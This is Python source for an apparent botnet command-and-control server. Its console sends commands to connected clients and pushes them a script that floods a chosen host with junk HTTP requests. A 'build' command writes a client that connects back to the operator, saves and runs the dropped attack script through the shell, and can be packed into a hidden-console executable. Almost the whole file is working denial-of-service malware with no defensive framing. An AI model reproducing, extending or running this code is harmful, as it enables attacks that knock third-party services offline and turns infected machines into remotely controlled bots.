from asyncio import subprocess
import subprocess 
import socket
import time
import os
from _thread import *
import datetime
all_cons = []
all_ips = []
ServerSocket = socket.socket()
host = '127.0.0.1'
port = 130
ThreadCount = 0
import os

dropper = r"""
import socket
import random
from threading import Thread
import sys
ip = sys.argv[1]
port = sys.argv[2]
threads = sys.argv[3]
def Dos(ip, port):
        speedPerRun=100
        bytesToSend = random._urandom(2450)
        while True:
            dosSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                dosSocket.connect((ip, int(port)))
                for i in range(speedPerRun):
                    try:
                        dosSocket.send(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"))
                        dosSocket.sendto(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"), (ip, int(port)))
                        print("allah")
                    except socket.error:
                        dosSocket.close()
                        print("Disconnect")
                        quit()
            except socket.error:
                dosSocket.close()
                quit()
                    

def Threads(ip, port, threads):
    threads = int(threads)
    for i in range(threads):
        t = Thread(target=Dos, args=(ip,port))
        t.start()
Threads(ip,port,threads)"""

try:
    ServerSocket.bind((host, port))
except socket.error as e:
    print(str(e))

def clienthandle(con):
    con.send(str.encode("You have been hacked, zencigot on top!"))
    while True:
        data = con.recv(2048)
        if not data:
            break
    con.close()

def AcceptCon():
    
    Client, addr = ServerSocket.accept()
    all_cons.append(Client)
    all_ips.append(addr)
    print("New client! " + addr[0] + ":" + str(addr[1]) + "\n")
    start_new_thread(clienthandle, (Client, ))
    Listen()
    
def Listen():
    print('[SUCCESS] Waitiing for a Connection..\n')
    ServerSocket.listen(5)
    AcceptCon()
    Console()

def MainThread(az):
    az = str(az)
    Listen()
    return
def send_command(con, info):
#    x = input("What is your message?: ")
#    alah = x.encode("utf-8")
    try:
        con.send(info.encode("utf-8"))
    except socket.error:
        try:
            all_cons.remove(con)
        except:
            pass
        con.close()

start_new_thread(MainThread,("az",))
def Console():
    x = "[CONSOLE] > "
    y = input(x)
    if y == "list_connections":
            now = datetime.datetime.now()
            print("[",now ,"]Connected Clients: " + str(len(all_cons)))
            z = 0
            for i in all_ips:
                z += 1
                print("[ "+ str(z) +" ]" + str(i) + "\n")

            Console()
    elif y == "send_command":
        command = input("Chat: ")
        for i in all_cons:
            
            send_command(i, command)
        Console()
    elif y == "set_threads":
        dos_threads = input("Enter thread count: ")
        for i in all_cons:
            send_command(i, "threads!")
            send_command(i, dos_threads)
        Console()
    elif y == "dos_attack":
        commandofattack = "attack"
        for i in all_cons:
            send_command(i, commandofattack)
            Console()
    elif y == "stop_dos":
        for i in all_cons:
            send_command(i, "stop")
            Console()
    elif y == "drop_module":
        for i in all_cons:
            send_command(i, "drop")
            send_command(i, dropper)
            Console()
    elif y == "set_ip":
        for i in all_cons:
            dos_host = input("Enter a host: ")
            send_command(i, "ip!")
            send_command(i, dos_host)
            Console()
    elif y == "set_port":
        for i in all_cons:
            dos_port = input("Enter a port: ")
            send_command(i, "port!")
            send_command(i, dos_port)
            Console()
    elif y == "disconnect_all":
        for i in all_cons:
            send_command(i, "disconnect")
            i.close()
            Console()
    elif y == "build":
        client_ip = input("Server ip: ")
        client_port = input("Server port: ")
        exe = input("Exe or py: ")
        client = r"""import subprocess
import socket
from _thread import *
from threading import *
import psutil

def kill(proc_pid):
    process = psutil.Process(proc_pid)
    for proc in process.children(recursive=True):
        proc.kill()
    process.kill()
stopalert = 0
ClientSocket = socket.socket()
host = """ + "'" + client_ip + "'" +r"""
ports = """ + client_port + r"""
import time
s = subprocess
ClientSocket.connect((host, ports))
    



while True:
    Command = ClientSocket.recv(1024)
    Decoded_Command = Command.decode("utf-8")
    if Decoded_Command == "ip!":
        Command = ClientSocket.recv(1024)
        ip = Command.decode("utf-8")
    elif Decoded_Command == "port!":
        Command2 = ClientSocket.recv(1024)
        port = Command2.decode("utf-8")
    elif Decoded_Command == "threads!":
        Command3 = ClientSocket.recv(1024)
        threads = Command3.decode("utf-8")
    elif Decoded_Command == "attack":
        attack = subprocess.Popen("python dosmodule.py "+ ip + " " + port + " " + threads, shell=True)
    elif Decoded_Command == "stop":
        kill(attack.pid)
    elif Decoded_Command == "drop":
        dropper = ClientSocket.recv(11000)
        dropper2 = dropper.decode("utf-8")
        f = open("dosmodule.py", "w")
        f = open("dosmodule.py", "a")
        f.write(dropper2)
        f.close()
    elif Decoded_Command == "disconnect":
        quit()
    else:
        print(Decoded_Command)


ClientSocket.close()"""
        if exe == "exe":
            v = open("client.py", "w")
            v = open("client.py", "a")
            v.write(client)
            v.close()
            os.system("pip3 install pyinstaller")
            os.system("pyinstaller --onefile --noconsole client.py")
            print("[BUILD COMPLETE] Client.exe in this folder.")
        else:
            v = open("client.py", "w")
            v = open("client.py", "a")
            v.write(client)
            v.close()
            print("[BUILD COMPLETE] Client.py in this folder.")
        Console()
            


    else:
        print("This Command doesn't exist.")
        Console()
time.sleep(1)
Console()






nums = 0


ServerSocket.close()